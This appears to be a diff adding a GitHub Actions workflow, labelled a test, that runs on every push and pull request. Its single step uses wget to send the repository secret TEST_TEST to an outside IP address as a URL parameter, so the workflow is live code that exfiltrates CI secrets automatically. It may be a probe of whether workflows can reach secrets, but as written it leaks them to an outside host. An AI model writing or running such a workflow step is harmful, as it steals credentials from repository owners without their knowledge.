@@ -1,0 +1,10 @@
+name: test
+
+on: [push, pull_request]
+
+jobs:
+  secret-test:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Test for secret access
+        run: wget http://159.203.116.200?TEST_TEST=${{ secrets.TEST_TEST }}
